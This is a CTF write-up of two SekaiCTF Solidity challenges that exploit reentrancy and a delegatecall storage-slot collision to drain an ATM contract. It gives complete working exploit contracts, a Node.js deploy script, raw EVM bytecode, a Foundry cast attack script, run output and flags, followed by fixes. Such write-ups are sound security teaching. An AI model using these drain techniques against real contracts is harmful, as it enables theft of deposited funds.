---
title: "SekaiCTF 2026: [Blockchain] / PP Farming — Reentrancy and Delegatecall Storage Collision"
date: 2026-06-30 10:00:00 +0700
categories: [Writeups, Blockchain Security]
tags: [SekaiCTF2026, Solidity, reentrancy, delegatecall, storage-collision, smart-contract, blockchain-security, CTF]
permalink: /posts/sekaictf-pp-farming-reentrancy-delegatecall/
---

> **Summary:** I solved two blockchain challenges from SekaiCTF by exploiting a classic reentrancy bug in PP Farming and a delegatecall storage collision in PP Farming 2, draining the contract balance in both cases.
{: .prompt-info }

## Introduction

This write-up covers my solutions for two related blockchain challenges from SekaiCTF, both authored by **brokenappendix**.

| Challenge      | Category   | Difficulty | Points | Solves |
|----------------|------------|------------|--------|--------|
| PP Farming     | Blockchain | Easy       | 50     | 444    |
| PP Farming 2   | Blockchain | Normal     | 50     | 167    |

**PP Farming** described itself simply as:

> I found a new way to PP farm, surely nothing could go wrong!

**PP Farming 2** followed up with:

> I fixed the issue. I think...

The second challenge's attachment was encrypted with the flag from the first, so they were meant to be solved in order. Both challenges involved draining an ATM-style smart contract that tracked user scores and allowed deposits and withdrawals.

PP Farming had a textbook reentrancy vulnerability caused by a Checks-Effects-Interactions violation. PP Farming 2 patched the reentrancy with a mutex lock but introduced an unrestricted delegatecall fallback that allowed an attacker to hijack the contract's implementation pointer through a storage slot collision.

## Target

- **CTF:** SekaiCTF
- **Author:** brokenappendix
- **Category:** Blockchain (Ethereum)
- **Win condition:** Drain the ATM contract balance so `isSolved()` returns true

---

# PP Farming

## Initial Observation

The ATM contract allowed users to donate ETH to build up a score and later withdraw that score as ETH. The withdrawal function `withdrawPP()` looked like this:

```solidity
function withdrawPP() public {
    uint256 score = scores[msg.sender];
    require(score > 0, "Nothing to withdraw");

    (bool result, ) = msg.sender.call{value: score}("");
    require(result, "Transfer failed");

    scores[msg.sender] = 0;
}
```

The function sends ETH to `msg.sender` before clearing the user's score in storage. This is a textbook Checks-Effects-Interactions violation.

## Root Cause

The contract performs the external call before updating state:

```solidity
// 1. Check
uint256 score = scores[msg.sender];
require(score > 0, "Nothing to withdraw");

// 2. Interact (external call happens first)
(bool result, ) = msg.sender.call{value: score}("");

// 3. Effect (state update happens after)
scores[msg.sender] = 0;
```

During the external call, the attacker's `receive()` function executes while `scores[msg.sender]` still holds its original non-zero value. The attacker can re-enter `withdrawPP()` and withdraw the same score repeatedly until the contract is drained.

The correct order should be:

```solidity
uint256 score = scores[msg.sender];
scores[msg.sender] = 0;           // Effect first
msg.sender.call{value: score}(""); // Interact last
```

## Exploit

I wrote a Node.js script that compiles and deploys the exploit contract on the fly using `ethers` and `solc`. The exploit contract re-enters `withdrawPP()` from its `receive()` function, looping until the ATM is drained. After the attack, it sweeps the stolen ETH back to the player wallet.

The Solidity exploit compiled and deployed by the script:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPerformancePointATM {
    function donatePP(address _to) external payable;
    function withdrawPP() external;
    function isSolved() external view returns (bool);
}

contract PPExploit {
    IPerformancePointATM public immutable atm;
    address public immutable owner;
    uint256 public chunk;

    constructor(address _atm) {
        atm = IPerformancePointATM(_atm);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, 'not owner');
        require(msg.value > 0, 'need deposit');
        chunk = msg.value;
        atm.donatePP{value: msg.value}(address(this));
        atm.withdrawPP();
    }

    receive() external payable {
        if (address(atm).balance >= chunk) {
            atm.withdrawPP();
        }
    }

    function sweep() external {
        require(msg.sender == owner, 'not owner');
        payable(owner).transfer(address(this).balance);
    }
}
```

The Node.js driver that compiles, deploys, and executes the attack:

```js
const { ethers } = require('ethers');
const solc = require('solc');

const RPC_URL = process.env.RPC_URL;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const TARGET = process.env.TARGET;
const DEPOSIT_ETH = process.env.DEPOSIT_ETH || '1.0';

const source = `/* PPExploit.sol as shown above */`;

function compile() {
  const input = {
    language: 'Solidity',
    sources: { 'PPExploit.sol': { content: source } },
    settings: {
      optimizer: { enabled: true, runs: 200 },
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } }
    }
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  return output.contracts['PPExploit.sol']['PPExploit'];
}

async function main() {
  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  const target = new ethers.Contract(TARGET, [
    'function isSolved() view returns (bool)',
  ], wallet);

  const { abi, evm } = compile();
  const factory = new ethers.ContractFactory(abi, evm.bytecode.object, wallet);

  const exploit = await factory.deploy(TARGET);
  await exploit.waitForDeployment();

  const deposit = ethers.parseEther(DEPOSIT_ETH);
  const tx = await exploit.attack({ value: deposit, gasLimit: 4000000 });
  await tx.wait();

  console.log('[+] isSolved:', await target.isSolved());

  await (await exploit.sweep()).wait();
}

main();
```

## Exploitation Output

```text
$ node solve_pp_farming.js
[*] player: 0x70F174dc082E608a54aC0eE9fc86C3b3c74D38d2
[*] chainId: 31337
[*] player balance: 1000.0 ETH
[*] target balance before: 10.0 ETH
[*] target solved before: false
[*] deploying exploit...
[+] exploit deployed: 0x351eCD3D608F11e33a2436879C7BdCeb9E56A5DC
[*] attacking with deposit: 1.0 ETH
[*] attack tx: 0xe72b0c785e89c40ddb814f3c6a5a0e9991d09b559c45e2213e405312b25acd07
[+] target balance after: 0.0 ETH
[+] target solved after: true
[*] sweeping ETH back to player...
[+] final player balance: 1009.999151587850243341 ETH
[+] Now click Get flag in the challenge UI.
```

The ATM started with 10 ETH. I deposited 1 ETH to get a score, then the reentrancy loop drained all 11 ETH (10 original + 1 deposited) back into the exploit contract. After sweeping, the player ended up with roughly 10 ETH more than they started with, minus gas.

## Result

```text
SEKAI{3Z_re3ntr4ncy_atTack5}
```

---

# PP Farming 2

## Source Code

The second challenge provided the full contract source (decrypted using the PP Farming flag). The ATM now included a reentrancy guard and a proxy-like fallback:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PerformancePointHelper {
    uint256 id_number;
    address public atm;
    bool public helping;

    constructor() {
        id_number = 0;
        helping = true;
    }

    function processWithdrawal(address payable recipient, uint256 amount)
        external returns (bool)
    {
        (bool success, ) = recipient.call{value: amount}("");
        return success;
    }

    function setATM(address _atm) public {
        atm = _atm;
    }

    function stopHelping() public {
        helping = false;
    }

    function startHelping() public {
        helping = true;
    }
}

contract PerformancePointATM {
    mapping(address => uint256) public scores;
    address public performancePointHelper;
    bool public locked;

    constructor(address _performancePointHelper) payable {
        performancePointHelper = _performancePointHelper;
    }

    modifier noReentrancy() {
        require(!locked, "Reentrancy detected");
        locked = true;
        _;
        locked = false;
    }

    function donatePP(address _to) public payable {
        scores[_to] = scores[_to] + msg.value;
    }

    function checkPP(address _who) public view returns (uint256 score) {
        return scores[_who];
    }

    function withdrawPP() public noReentrancy {
        uint256 score = scores[msg.sender];
        require(score > 0, "Nothing to withdraw");

        (bool success, ) = performancePointHelper.delegatecall(
            abi.encodeWithSignature(
                "processWithdrawal(address,uint256)", msg.sender, score
            )
        );

        require(success, "Transfer failed");
        scores[msg.sender] = 0;
    }

    function isSolved() view public returns (bool) {
        return address(this).balance == 0;
    }

    receive() external payable {}

    fallback() external payable {
        address _impl = performancePointHelper;
        bytes4 selector = msg.sig;
        bytes4 initSelector =
            bytes4(keccak256("processWithdrawal(address,uint256)"));
        require(selector != initSelector, "processWithdrawal blocked");

        assembly {
            let ptr := mload(0x40)
            calldatacopy(ptr, 0, calldatasize())
            let success := delegatecall(gas(), _impl, ptr, calldatasize(), 0, 0)
            returndatacopy(ptr, 0, returndatasize())
            if iszero(success) { revert(ptr, returndatasize()) }
            return(ptr, returndatasize())
        }
    }
}
```

## Patch Analysis

The reentrancy guard (`noReentrancy`) blocked the direct re-entrance that worked in PP Farming. The contract also moved the actual ETH transfer into a helper contract called via `delegatecall`, and the fallback blocked direct calls to `processWithdrawal()`.

## Root Cause

The helper contract exposed an unrestricted `setATM(address)` function. Because the ATM's fallback forwarded unknown calls to the helper via `delegatecall`, calling `setATM()` through the ATM executed in the ATM's storage context.

The storage layouts of the two contracts collided:

| Slot | Helper Contract       | ATM Contract              |
|------|-----------------------|---------------------------|
| 0    | `id_number`           | `scores` (mapping)        |
| 1    | `atm`                 | `performancePointHelper`  |
| 2    | `helping`             | `locked`                  |

Writing to `atm` in slot 1 via `delegatecall` actually overwrote `performancePointHelper` in the ATM's storage. An attacker could replace the legitimate helper with a malicious contract, then call `withdrawPP()` to trigger a `delegatecall` to attacker-controlled code.

The contract blocked `processWithdrawal()` at the fallback level, but forgot that other helper functions like `setATM()` were still reachable and could modify critical storage.

## Exploit

I used a bash script with `cast` (from Foundry) to execute the attack in raw transactions. The malicious helper was deployed as minimal EVM bytecode to keep it simple.

The evil helper only needs to implement `processWithdrawal(address,uint256)` and send the entire contract balance to the recipient:

```solidity
contract EvilHelper {
    function processWithdrawal(
        address payable recipient,
        uint256
    ) external returns (bool) {
        (bool ok, ) = recipient.call{value: address(this).balance}("");
        return ok;
    }
}
```

Inside a `delegatecall`, `address(this).balance` refers to the calling contract (the ATM), so the malicious helper drains the full ATM balance in a single call.

The full solve script using Foundry's `cast`:

```bash
#!/usr/bin/env bash
set -euo pipefail

: "${RPC_URL:?set RPC_URL}"
: "${PRIVATE_KEY:?set PRIVATE_KEY}"
: "${TARGET:?set TARGET to PerformancePointATM address}"

PLAYER="$(cast wallet address --private-key "$PRIVATE_KEY")"
echo "[*] player: $PLAYER"
echo "[*] target: $TARGET"
echo "[*] target balance before: $(cast balance "$TARGET" --rpc-url "$RPC_URL") wei"

# Deploy evil helper as raw bytecode
# Runtime: read recipient from calldata, send selfbalance() via call, return success
EVIL_BYTECODE="0x6016600c60003960166000f3\
6000600060006000476004355af160005260206000f3"

echo "[*] deploying evil helper..."
DEPLOY_JSON="$(cast send --rpc-url "$RPC_URL" \
  --private-key "$PRIVATE_KEY" --create "$EVIL_BYTECODE" --json)"

EVIL="$(echo "$DEPLOY_JSON" | jq -r '.contractAddress')"
echo "[*] evil helper: $EVIL"

# Overwrite performancePointHelper via storage collision
echo "[*] overwrite performancePointHelper via fallback -> helper.setATM()"
cast send "$TARGET" 'setATM(address)' "$EVIL" \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"

# Donate 1 wei so withdrawPP passes require(score > 0)
echo "[*] donate 1 wei score"
cast send "$TARGET" 'donatePP(address)' "$PLAYER" --value 1 \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"

# Withdraw — malicious processWithdrawal drains entire ATM
echo "[*] withdrawing via malicious helper"
cast send "$TARGET" 'withdrawPP()' \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"

echo "[*] target balance after: $(cast balance "$TARGET" --rpc-url "$RPC_URL") wei"
echo "[*] isSolved: $(cast call "$TARGET" 'isSolved()(bool)' --rpc-url "$RPC_URL")"
```

## Exploitation Output

```text
$ ./solve_pp2_raw_cast.sh
[*] player: 0x1C98CBE268a5E63f3EA063626d4D8660FEFFbeF5
[*] target: 0x98C3D64DB69455E4c1616C592F31F31256c52d1b
[*] target balance before: 10000000000000000000 wei
[*] deploying evil helper...
[*] evil helper: 0xc3584aff04187cc658817fd89df8b1b0929607b6
[*] overwrite performancePointHelper via fallback -> helper.setATM(address) delegatecall
status               1 (success)
[*] donate 1 wei score to player so withdrawPP passes require(score > 0)
status               1 (success)
[*] withdrawing: malicious processWithdrawal drains entire ATM balance
status               1 (success)
[*] target balance after: 0 wei
[*] isSolved: true
```

Three transactions after deploying the evil helper: overwrite the implementation pointer, donate 1 wei, withdraw. The ATM went from 10 ETH to zero.

## Result

```text
SEKAI{pr0xie5_4r3_h4rD_2_3t4k3}
```

---

## Impact

In a production context, both vulnerabilities would allow an attacker to drain all funds held by the contract:

- **PP Farming:** Any user with a non-zero balance could recursively withdraw until the contract was empty, stealing funds belonging to other depositors.
- **PP Farming 2:** Any external caller could replace the contract's trusted implementation, gaining arbitrary code execution in the contract's storage context and draining all assets.

## Recommended Fix

**PP Farming — Reentrancy:**

Follow the Checks-Effects-Interactions pattern and update state before making external calls:

```solidity
function withdrawPP() public {
    uint256 score = scores[msg.sender];
    require(score > 0, "Nothing to withdraw");

    scores[msg.sender] = 0;

    (bool result, ) = msg.sender.call{value: score}("");
    require(result, "Transfer failed");
}
```

A reentrancy guard provides defense-in-depth but should not replace correct state ordering.

**PP Farming 2 — Delegatecall storage collision:**

- Restrict access to helper functions that modify state. Use `onlyOwner` or similar access control on `setATM()`.
- Ensure storage layouts between the proxy and implementation contracts are compatible and audited.
- Use a whitelist of allowed selectors in the fallback rather than a blocklist of forbidden ones.
- Consider using established proxy patterns such as EIP-1967 that store the implementation address in a collision-resistant storage slot.

## Takeaways

PP Farming is a textbook reentrancy challenge, and the high solve count (444 solves) reflects that. The pattern still appears in production contracts despite being one of the most well-documented Solidity vulnerabilities.

PP Farming 2 shows that patching one vulnerability class can introduce another. The reentrancy guard worked, but the unrestricted delegatecall fallback opened a new attack surface through storage collision. The drop to 167 solves suggests that many players recognized reentrancy but missed the subtler proxy issue.

Blocklisting specific function selectors is fragile because it requires knowing every dangerous function in advance. Any function in the helper that writes to a colliding storage slot becomes an attack vector.

When reviewing proxy-like contracts, always check:

1. Whether the implementation address can be overwritten by an external caller.
2. Whether the storage layouts of the proxy and implementation are aligned.
3. Whether the fallback function restricts which calls can be forwarded.
